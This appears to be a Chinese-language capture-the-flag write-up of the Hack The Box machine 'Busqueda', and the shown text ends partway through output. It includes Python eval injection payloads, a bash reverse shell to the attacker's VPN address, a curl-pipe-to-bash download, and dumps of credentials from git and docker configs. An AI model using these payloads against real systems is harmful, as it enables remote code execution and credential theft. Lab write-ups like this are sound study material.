+<p>sqlmap一下，没有注入点。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604194935260.png"></p>
+<p>点击后，发现如下东西：</p>
+<blockquote>
+<p>Custom Engine</p>
+<p>from searchor import Engine<br>Engine.new(“Colgate”, “<a href="https://www.colgate.com/en-us/search/all?term=">https://www.colgate.com/en-us/search/all?term=</a>“)<br>Engine.Colgate.search(“Hi world!”)<br>‘<a href="https://www.colgate.com/en-us/search/all?term=Hi%20world">https://www.colgate.com/en-us/search/all?term=Hi%20world</a>!”</p>
+<p>Searchor CLI Quick Start</p>
+<p>$ searchor Google “Hello World!” –copy</p>
+</blockquote>
+<p>这是调用引擎库去获取数据吧。</p>
+<p><code>Engine.Colgate.search(&quot;Hi world!&quot;)</code></p>
+<p>wp上说尝试构造<code>eval(complie(“要执行的代码”),“&lt;String&gt;”,“exec”)</code></p>
+<blockquote>
+<p>compile() 是一个 Python 内置函数，用于编译字符串、文件或 AST（Abstract Syntax Trees）对象成为字节码或 AST 对象。它的语法为：</p>
+<p>compile(source, filename, mode, flags&#x3D;0, dont_inherit&#x3D;False, optimize&#x3D;-1)<br>source: 必选项，表示要编译的源代码，可以是字符串、文件或 AST 对象。<br>filename: 可选项，表示编译代码的文件名，如果不是从文件中编译代码，传入 “<string>” 即可。<br>mode: 可选项，表示编译代码类型，可以取值为 “exec”（编译整个代码），“eval”（编译单个表达式）或 “single”（编译单个语句）。<br>flags: 可选项，传入变量或位掩码，用于控制编译器的行为或特性。<br>dont_inherit: 可选项，表示是否继承 sys.flags 和 sys. __ optimizations __ 模块中相关选项的值。<br>optimize: 可选项，表示优化级别，如果设置为 -1，表示使用默认优化级别。<br>compile() 函数编译完成后，将会返回一个 code 对象，这个对象可以传递给 exec() 函数执行，也可以将其作为模块使用。compile() 函数在 Python 中比较常用，常用于动态编译、语法检查和代码执行等场景中。</p>
+</blockquote>
+<p>在bp上这样构造：</p>
+<blockquote>
+<p>query&#x3D;123’<strong>%2b</strong>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))<strong>%2b’</strong></p>
+</blockquote>
+<p>+、%20我都试过，不行，为啥非要2b,2f也可以，不懂</p>
+<p>效果是这样的，</p>
+<blockquote>
+<p>searchor Google <strong>‘</strong>123’%2beval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))%2b’<strong>’</strong>–copy</p>
+</blockquote>
+<p>相当于执行了参数为:</p>
+<p><strong>‘</strong>123’ </p>
+<p>eval(compile(“import+os\nos.system(‘ls’)+”,’&lt;String&gt;’,’exec’))</p>
+<p>和&#39;‘</p>
+<p>repeat结果里是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=&quot;app.py%0Atemplates&quot;&gt;app.py</span><br><span class="line">templates&lt;/a&gt;. If not, click the link.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那其实ls可以改为 cat app.py，出现一串代码</p>
+<p>shift+ctrl+u后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, render_template, request, redirect</span><br><span class="line">from searchor import Engine</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/&amp;#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&amp;#x27;&amp;#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#x27;/search&amp;#x27;, methods=[&amp;#x27;POST&amp;#x27;])</span><br><span class="line">def search():</span><br><span class="line">    try:</span><br><span class="line">        engine = request.form.get(&amp;#x27;engine&amp;#x27;)</span><br><span class="line">        query = request.form.get(&amp;#x27;query&amp;#x27;)</span><br><span class="line">        auto_redirect = request.form.get(&amp;#x27;auto_redirect&amp;#x27;)</span><br><span class="line">        </span><br><span class="line">        if engine in Engine.__members__.keys():</span><br><span class="line">            arg_list = [&amp;#x27;searchor&amp;#x27;, &amp;#x27;search&amp;#x27;, engine, query]</span><br><span class="line">            r = subprocess.run(arg_list, capture_output=True)</span><br><span class="line">            url = r.stdout.strip().decode()</span><br><span class="line">            if auto_redirect is not None:</span><br><span class="line">                return redirect(url, code=302)</span><br><span class="line">            else:</span><br><span class="line">                return url</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line">            return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Invalid engine!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">        return render_template(&amp;#x27;index.html&amp;#x27;, options=Engine.__members__, error=&quot;Something went wrong!&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#x27;__main__&amp;#x27;:</span><br><span class="line">    app.run(debug=False)</span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="1-shell文件准备"><a href="#1-shell文件准备" class="headerlink" title="1.shell文件准备"></a>1.shell文件准备</h4><p>写一个shell文件</p>
+<p>内容为：<code>bash -i &gt;&amp; /dev/tcp/10.10.14.89/2333 0&gt;&amp;1</code></p>
+<p>这个地址是与htp进行vpn连接的那个地址吧,tun0。</p>
+<p>具体步骤也就是vim shell后，再chmod 777 shell.</p>
+<h4 id="2-监听服务器建立"><a href="#2-监听服务器建立" class="headerlink" title="2.监听服务器建立"></a>2.监听服务器建立</h4><p><code>python3 -m http.server 80</code> 通常用于在本地开发或测试时快速提供 Web 内容。</p>
+<h4 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h4><p><code>nc -lvnp 2333</code></p>
+<h4 id="4-发包"><a href="#4-发包" class="headerlink" title="4.发包"></a>4.发包</h4><p>包的数据写为</p>
+<p><code>query=http%3a//127.0.0.1/debug&#39;%2beval(compile(&#39;for+x+in+range(1)%3a\n+import+os\n+os.system(&quot;curl+http%3a//10.10.14.89/shell|bash&quot;)&#39;,&#39;a&#39;,&#39;single&#39;))%2b&#39;</code></p>
+<p>(不明觉厉o(￣▽￣)ｄ )</p>
+<p>。。。然后捏，我没监听到东西。</p>
+<p>好吧，<strong>是因为kali有防火墙</strong></p>
+<p><code>sudo systemctl stop ufw</code></p>
+<p><code>sudo systemctl disable ufw</code></p>
+<p>将防火墙禁用，重新发包即可。</p>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230604214533285.png"></p>
+<p>nc监听成功。</p>
+<p>然后在nc窗口下</p>
+<p>输入命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">connect to [10.10.14.89] from (UNKNOWN) [10.10.11.208] 56914</span><br><span class="line">bash: cannot set terminal process group (1648): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">svc@busqueda:/var/www/app$ pwd </span><br><span class="line">pwd</span><br><span class="line">/var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ whoami</span><br><span class="line">whoami</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/var/www/app$ ls</span><br><span class="line">ls</span><br><span class="line">app.py</span><br><span class="line">templates</span><br><span class="line">svc@busqueda:/var/www/app$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">svc@busqueda:/home$ ls</span><br><span class="line">ls</span><br><span class="line">svc</span><br><span class="line">svc@busqueda:/home$ cd svc</span><br><span class="line">cd svc</span><br><span class="line">svc@busqueda:~$ ls </span><br><span class="line">ls</span><br><span class="line">snap</span><br><span class="line">user.txt</span><br><span class="line">svc@busqueda:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">40941e3cddd105f881ea90e716a3d6a2</span><br><span class="line"></span><br><span class="line">cat etc/hosts</span><br><span class="line">127.0.0.1 localhost</span><br><span class="line">127.0.1.1 busqueda searcher.htb gitea.searcher.htb</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>(内网信息收集部分，参考大佬的习惯是先看sudo -l，再看是否存在未知域名，然后再看web文件夹)<br>访问下未知域名gitea.searcher.htb，<strong>反正我不知道怎么访问</strong>（后面有，先放一边）。</p>
+<p>密码一般在etc&#x2F;passwd和etc&#x2F;shadow中，后者的密码一般是哈希值。</p>
+<p>在passwd中找有bash权限的用户，已知有svc，且确定下一个提权的是root</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/$ cat etc/passwd|grep /bin/bash</span><br><span class="line">cat etc/passwd|grep /bin/bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">svc:x:1000:1000:svc:/home/svc:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>重新找到svc文件夹，这次要记得查看<strong>所有</strong>文件，注意隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 60</span><br><span class="line">drwxr-x--- 6 svc  svc  4096 Jun  4 12:57 .</span><br><span class="line">drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache</span><br><span class="line">-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 10:26 .gnupg</span><br><span class="line">drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local</span><br><span class="line">lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile</span><br><span class="line">lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -&gt; /dev/null</span><br><span class="line">drwx------ 3 svc  svc  4096 Jun  4 04:06 snap</span><br><span class="line">-rw-r----- 1 root svc    33 Jun  4 03:26 user.txt</span><br><span class="line">-rw------- 1 svc  svc  9573 Jun  4 11:29 .viminfo</span><br><span class="line">-rw------- 1 svc  svc    54 Jun  4 07:23 .Xauthority</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>-l长格式信息,-a 所有</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ cat .gitconfig</span><br><span class="line">cat .gitconfig</span><br><span class="line">[user]</span><br><span class="line">        email = cody@searcher.htb</span><br><span class="line">        name = cody</span><br><span class="line">[core]</span><br><span class="line">        hooksPath = no-hooks</span><br></pre></td></tr></table></figure>
+
+<p>注意到，一开始监听进来时，有&#x2F;var&#x2F;www&#x2F;app，查看下隐藏文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/home$  ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd ..</span><br><span class="line">cd ..</span><br><span class="line">svc@busqueda:/$ cd /var/www/app</span><br><span class="line">cd /var/www/app</span><br><span class="line">svc@busqueda:/var/www/app$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .</span><br><span class="line">drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .git</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates</span><br><span class="line">svc@busqueda:/var/www/app$ </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/var/www/app$ cd .git</span><br><span class="line">cd .git</span><br><span class="line">svc@busqueda:/var/www/app/.git$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 52</span><br><span class="line">drwxr-xr-x 8 www-data www-data 4096 Jun  4 03:26 .</span><br><span class="line">drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches</span><br><span class="line">-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG</span><br><span class="line">-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config</span><br><span class="line">-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description</span><br><span class="line">-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEAD</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks</span><br><span class="line">-rw-r--r-- 1 root     root      259 Apr  3 15:09 index</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 info</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logs</span><br><span class="line">drwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objects</span><br><span class="line">drwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看下config和logs</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">svc@busqueda:/var/www/app/.git$ cat config</span><br><span class="line">cat config</span><br><span class="line">[core]</span><br><span class="line">        repositoryformatversion = 0</span><br><span class="line">        filemode = true</span><br><span class="line">        bare = false</span><br><span class="line">        logallrefupdates = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</span><br><span class="line">        fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;main&quot;]</span><br><span class="line">        remote = origin</span><br><span class="line">        merge = refs/heads/main</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cd main</span><br><span class="line">cd main</span><br><span class="line">bash: cd: main: Not a directory</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 www-data www-data 4096 Apr  3 14:33 .</span><br><span class="line">drwxr-xr-x 3 www-data www-data 4096 Apr  3 14:33 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  163 Apr  3 14:33 main</span><br><span class="line">svc@busqueda:/var/www/app/.git/logs/refs/remotes/origin$ cat main</span><br><span class="line">cat main</span><br><span class="line">0000000000000000000000000000000000000000 5ede9ed9f2ee636b5eb559fdedfd006d2eae86f4 administrator &lt;administrator@gitea.searcher.htb&gt; 1671970461 +0000  update by push</span><br><span class="line">这里大佬已经试用过了，哈希值破不开，转看config</span><br></pre></td></tr></table></figure>
+
+<p>哎，上述内容在大佬博客里引入了linpeas工具，应该是可以帮助自动查找文件的。</p>
+<p>关注下这串代码：</p>
+<p><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></p>
+<p>尝试下cody后的东西作为密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#x73;&#x76;&#x63;&#x40;&#49;&#x30;&#46;&#49;&#x30;&#46;&#49;&#x31;&#46;&#x32;&#x30;&#x38;">&#x73;&#x76;&#x63;&#x40;&#49;&#x30;&#46;&#49;&#x30;&#46;&#49;&#x31;&#46;&#x32;&#x30;&#x38;</a>，ssh连接即可。</p>
+<h3 id="svc-gt-root"><a href="#svc-gt-root" class="headerlink" title="svc-&gt;root"></a>svc-&gt;root</h3><p>登录进来后</p>
+<p><code>sudo -l</code> 为了看看当前用户可执行的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>之后的操作便是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls 有user.txt</span><br><span class="line"></span><br><span class="line">cd /</span><br><span class="line"></span><br><span class="line">ls   有etc文件夹</span><br><span class="line"></span><br><span class="line">cd etc</span><br><span class="line"></span><br><span class="line">ls ，看到了有apache2文件夹</span><br><span class="line"></span><br><span class="line">cd apache2</span><br><span class="line">svc@busqueda:/etc/apache2$ ls</span><br><span class="line">apache2.conf    conf-enabled  magic           mods-enabled  sites-available</span><br><span class="line">conf-available  envvars       mods-available  ports.conf    sites-enabled</span><br><span class="line">svc@busqueda:/etc/apache2$ cat  sites-available</span><br><span class="line"></span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -a</span><br><span class="line">.  ..  000-default.conf  default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ ls -la</span><br><span class="line">total 20</span><br><span class="line">drwxr-xr-x 2 root root 4096 Apr  4 16:08 .</span><br><span class="line">drwxr-xr-x 8 root root 4096 Apr  4 16:08 ..</span><br><span class="line">-rw-r--r-- 1 root root  837 Feb 20 14:06 000-default.conf</span><br><span class="line">-rw-r--r-- 1 root root 6338 Sep 30  2022 default-ssl.conf</span><br><span class="line">svc@busqueda:/etc/apache2/sites-available$ cat 000-default.conf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:5000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:5000/</span><br><span class="line"></span><br><span class="line">        RewriteEngine On</span><br><span class="line">        RewriteCond %&#123;HTTP_HOST&#125; !^searcher.htb$</span><br><span class="line">        RewriteRule /.* http://searcher.htb/ [R]</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        ProxyPreserveHost On</span><br><span class="line">        ServerName gitea.searcher.htb</span><br><span class="line">        ServerAdmin admin@searcher.htb</span><br><span class="line">        ProxyPass / http://127.0.0.1:3000/</span><br><span class="line">        ProxyPassReverse / http://127.0.0.1:3000/</span><br><span class="line"></span><br><span class="line">        ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log</span><br><span class="line">        CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发现了gitea.searcher.htb网址，尝试登录：http或https，或加上端口3000都不行，想到添加域名</p>
+<p>切换到主机的终端</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# vim /etc/hosts</span><br><span class="line"></span><br><span class="line">添加</span><br><span class="line">10.10.11.208 gitea.searcher.htb</span><br></pre></td></tr></table></figure>
+
+<p>打开浏览器输入<a href="http://gitea.searcher.htb/">http://gitea.searcher.htb</a></p>
+<p>点击右上角sign in 出现</p>
+<p><img src="/../../../Typora/img111/image-20230606214158201.png" alt="image-20230606214158201"></p>
+<p>先放一遍。</p>
+<p>再次在svc用户界面下，</p>
+<p>sudo -l，</p>
+<p>关注以下操作。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line">Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)</span><br><span class="line"></span><br><span class="line">     docker-ps     : List running docker containers</span><br><span class="line">     docker-inspect : Inpect a certain docker container</span><br><span class="line">     full-checkup  : Run a full system checkup</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>对这三个命令依次运行一下，</p>
+<p><img src="/../../../Typora/img111/image-20230606222958314.png" alt="image-20230606222958314"></p>
+<p>发现docker-inspect 需要配合 -f和容器名才有显示</p>
+<p>doker-inspect官方说明得：</p>
+<p><a href="https://docs.docker.com/engine/reference/commandline/inspect/">docs.docker.com&#x2F;engine&#x2F;reference&#x2F;commandline&#x2F;inspect&#x2F;</a></p>
+<p><img src="/../../../Typora/img111/image-20230606223323788.png" alt="image-20230606223323788"></p>
+<p>例子：</p>
+<p><code>docker inspect --format=&#39;&#123;&#123;.LogPath&#125;&#125;&#39; $INSTANCE_ID</code></p>
+<p><code>docker inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; $INSTANCE_ID</code></p>
+<p>已知在…docker-ps命令下得到容器ID为960873171e2e和f84a6b33fb5a</p>
+<p>先看ID1的：</p>
+<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; 960873171e2e</code>得：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:/etc/apache2/sites-available$ </span><br><span class="line">sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#x27;&#123;&#123;json .Config&#125;&#125;&#x27; 960873171e2e</span><br><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;960873171e2e&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;22/tcp&quot;:&#123;&#125;,&quot;3000/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;],&quot;Cmd&quot;:[&quot;/bin/s6-svscan&quot;,&quot;/etc/s6&quot;],&quot;Image&quot;:&quot;gitea/gitea:latest&quot;,&quot;Volumes&quot;:&#123;&quot;/data&quot;:&#123;&#125;,&quot;/etc/localtime&quot;:&#123;&#125;,&quot;/etc/timezone&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;/usr/bin/entrypoint&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;server&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;,&quot;maintainer&quot;:&quot;maintainers@gitea.io&quot;,&quot;org.opencontainers.image.created&quot;:&quot;2022-11-24T13:22:00Z&quot;,&quot;org.opencontainers.image.revision&quot;:&quot;9bccc60cf51f3b4070f5506b042a3d9a1442c73d&quot;,&quot;org.opencontainers.image.source&quot;:&quot;https://github.com/go-gitea/gitea.git&quot;,&quot;org.opencontainers.image.url&quot;:&quot;https://github.com/go-gitea/gitea&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>有数据库信息为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;USER_UID=115&quot;,&quot;USER_GID=121&quot;,&quot;GITEA__database__DB_TYPE=mysql&quot;,&quot;GITEA__database__HOST=db:3306&quot;,&quot;GITEA__database__NAME=gitea&quot;,&quot;GITEA__database__USER=gitea&quot;,&quot;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;USER=git&quot;,&quot;GITEA_CUSTOM=/data/gitea&quot;]</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>GITEA__database__USER&#x3D;gitea”,”GITEA__database__PASSWD&#x3D;yuiu1hoiu4i5ho1uh</p>
+</blockquote>
+<p>看下另一个ID的</p>
+<p><code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py  docker-inspect --format=&#39;&#123;&#123;json .Config&#125;&#125;&#39; f84a6b33fb5a</code></p>
+<p>得到结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--format=&#123;&quot;Hostname&quot;:&quot;f84a6b33fb5a&quot;,&quot;Domainname&quot;:&quot;&quot;,&quot;User&quot;:&quot;&quot;,&quot;AttachStdin&quot;:false,&quot;AttachStdout&quot;:false,&quot;AttachStderr&quot;:false,&quot;ExposedPorts&quot;:&#123;&quot;3306/tcp&quot;:&#123;&#125;,&quot;33060/tcp&quot;:&#123;&#125;&#125;,&quot;Tty&quot;:false,&quot;OpenStdin&quot;:false,&quot;StdinOnce&quot;:false,&quot;Env&quot;:[&quot;MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF&quot;,&quot;MYSQL_USER=gitea&quot;,&quot;MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh&quot;,&quot;MYSQL_DATABASE=gitea&quot;,&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;,&quot;GOSU_VERSION=1.14&quot;,&quot;MYSQL_MAJOR=8.0&quot;,&quot;MYSQL_VERSION=8.0.31-1.el8&quot;,&quot;MYSQL_SHELL_VERSION=8.0.31-1.el8&quot;],&quot;Cmd&quot;:[&quot;mysqld&quot;],&quot;Image&quot;:&quot;mysql:8&quot;,&quot;Volumes&quot;:&#123;&quot;/var/lib/mysql&quot;:&#123;&#125;&#125;,&quot;WorkingDir&quot;:&quot;&quot;,&quot;Entrypoint&quot;:[&quot;docker-entrypoint.sh&quot;],&quot;OnBuild&quot;:null,&quot;Labels&quot;:&#123;&quot;com.docker.compose.config-hash&quot;:&quot;1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b&quot;,&quot;com.docker.compose.container-number&quot;:&quot;1&quot;,&quot;com.docker.compose.oneoff&quot;:&quot;False&quot;,&quot;com.docker.compose.project&quot;:&quot;docker&quot;,&quot;com.docker.compose.project.config_files&quot;:&quot;docker-compose.yml&quot;,&quot;com.docker.compose.project.working_dir&quot;:&quot;/root/scripts/docker&quot;,&quot;com.docker.compose.service&quot;:&quot;db&quot;,&quot;com.docker.compose.version&quot;:&quot;1.29.2&quot;&#125;&#125;